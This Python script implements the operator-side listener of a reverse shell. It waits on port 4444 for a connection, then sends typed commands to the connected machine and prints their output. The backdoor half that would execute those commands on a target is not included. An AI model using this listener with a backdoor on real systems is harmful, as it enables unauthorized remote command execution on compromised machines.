#!/usr/bin/python3

import socket, json

class Listener: 
    # Basic Listener class
    def __init__(self, address: tuple):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(address)
        listener.listen(0)
        print('[*] Waiting for incoming connections')
        self.connection, address = listener.accept()
        print(f'[+] Got a connection from {str(address)}')

    def reliable_send(self, data):
        # Safety way to send data as json
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        # Safety way to receive data as json, until everything income
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self, command):
        # Method which sending and receiving data
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        # Method which run everythong - receiving, sendin, executing, etc.
        while True:
            command = input('>> ')
            result = self.execute_remotely(command)
            print(result)

# Example
my_listener = Listener(('127.0.0.1', 4444))
my_listener.run()